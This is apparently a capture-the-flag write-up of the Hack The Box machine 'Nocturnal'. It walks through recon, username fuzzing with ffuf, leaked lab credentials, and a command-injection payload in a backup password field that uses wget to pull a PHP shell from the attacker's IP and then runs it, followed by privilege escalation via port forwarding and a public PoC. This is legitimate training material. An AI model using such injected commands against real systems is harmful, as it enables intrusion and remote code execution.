---
title: 'HTB-Nocturnal'
published: 2025-09-18
draft: false
toc: true
---
**Start 20:15 10-07-2025**

---
```
Scope:
10.10.11.64
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn nocturnal.htb

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/TCP - HTTP

![](attachments/9deb582fa0e5059277de20a1154d96ba.png)

I registered an account as `test - test123` and got the welcome screen:

![](attachments/5d453bbea064a8917e3bf58dc6918c9c.png)

I tried uploading a webshell and got this error:

![](attachments/a160a4d6d1ddd5ec485342fbe9c3f208.png)

![](attachments/8cc91e69d2123d4e7e6b86b8ea2708dd.png)

I opened `caido` and started modifying the request:

![](attachments/f023e482f00579bb45ffbea34c90e0db.png)

![](attachments/1d3d6b19c56b1b995d992aec87a29cc9.png)

I changed it to `webshell.php.pdf`:

![](attachments/3cc111107fee28234259487dbea733da.png)

I couldn't access the files however:

![](attachments/719b866ab8c8aec36e026895dc3c8cff.png)

### gobuster

I ran a `gobuster` scan to enumerate the endpoints:

![](attachments/8798bebe6a0d32d8ebbb91eba663b29e.png)

In `caido` I noticed these requests:

![](attachments/a76074e7904953394cf7b28537e401a1.png)

### ffuf

So I tried brute forcing any usernames:

```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=webshell.pdf' -w /usr/share/seclists/Usernames/statistically-likely-usernames/john.txt -fs 2985 -t 100 -H 'Cookie: PHPSESSID=4k0p6cgchd4dvfk8ubfjsnb8tj'
```

![](attachments/e7c509c2b0cf4e6b23f65d6bdb88363b.png)

I added them all to a `users.txt` file for further brute forcing.

I then went on to manipulate the request with the found usernames and found this:

![](attachments/51a452bd606bf8159fea447fa5242d12.png)

![](attachments/9b834f48370db906debb51cc72f1fa84.png)

:::note
The other users had no files.
:::

![](attachments/e37bb7390893adb97941dc50de266df8.png)

![](attachments/4e5f914163ff27b03a72f18152734282.png)

```creds
amanda
arHkG7HAI68X8s1J
```

However I was not able to log in with this password:

![](attachments/14559b953a61b3c2e5da1efa6b633900.png)

Neither were any of the other 2 able to log in with this password:

![](attachments/dcfa65ff6e998d2768672b754d4b3a74.png)

This probably meant that I had to use these creds online:

![](attachments/7fc2cf671d6703aacfbf381091d8b258.png)

![](attachments/4d2148c3b0dcaeef59fec4dcaa5ef76a.png)

I can create backups here:

![](attachments/54bb950ab835c46f06a232219901da59.png)

![](attachments/329caef23d7f6e57bf1cdc06d05ea57c.png)

### Command Injection

However this didn't give me anything juicy, but viewing the request I saw a potential **Command Injection** vulnerability:

```http
password=%0Abash%09-c%09"wget%0910.10.14.17/shell.php"%0A&backup=
```

![](attachments/02dd60d865c7eae31afd7ed9f4071c57.png)

![](attachments/94b71594c55fbcce800e7abcc6b58fe1.png)

```http
password=%0Abash%09-c%09"php%09shell.php"%0A&backup=
```

![](attachments/0fe671b5eed38e2b105f560041f76559.png)

# Foothold
## Shell as www-data

![](attachments/f409f152224c5c3c9f4dccb3d865ddda.png)

I then upgraded my shell to a `penelope` shell:

![](attachments/f0a4f0ececa3309e93dcca5cef0d88b6.png)

Here I found this `db`:

![](attachments/8c3df3446b78773cc6329a5c6fefc618.png)

I went ahead and downloaded it so I could view it with `sqlite3`:

![](attachments/7afba72e4d9b0ca44fe8cbf7275885df.png)

![](attachments/f3faf3a84c463a7478db27428ad5f012.png)

I went ahead and cracked them using crackstation:

![](attachments/1c4ed45dd2710ccaa77744bdf4ca8868.png)

I found a valid set:

```
tobias
slowmotionapocalypse
```

## Lateral Movement

![](attachments/6449a631f6f763b76afb3d4e9cb7e4a2.png)

### user.txt

![](attachments/b4a6ed63a01703b1e98a2d4c28e21201.png)

# Privilege Escalation
## Enumeration

I started off with `linpeas.sh`:

![](attachments/ecb692d59e7963ee761b0a5864e5a18f.png)

![](attachments/518a40288c00a35d4e27e41b8779e0ae.png)

:::note
There's a bunch of ports open on localhost, I might have to check it out.
:::

## Port Forward

![](attachments/fa73480f0cf33b63c623eb85a6754d87.png)

Let's check it out:

![](attachments/7dadccb56c02e97741807238820d2480.png)

![](attachments/d5dccaa8708e17c31f4e35a7e4b5e750.png)

I tried to brute force the creds, and the following combo worked:

```
admin
slowmotionapocalypse
```

From the source code I can find the version:

![](attachments/e4cfc968fedb869e2356f9de70ef2088.png)

Let's do some OSINT.

![](attachments/9f358f648a26c4ed34375d836d510396.png)

## PoC -> root

I used the following poc:

![](attachments/571248aed40011b7d8d4f96bcd964268.png)

![](attachments/78cd3f23c462c7d6bfd341b991a06108.png)

### root.txt

![](attachments/ce3e1989c71dd4ed01ea19e6619079a9.png)

![](attachments/4d3749f9c2a23012da06e3190c15475d.png)

---

**Finished 10-07-2025**

[^Links]: [[Hack The Box]]

#command-injection #ffuf #port-forwarding 
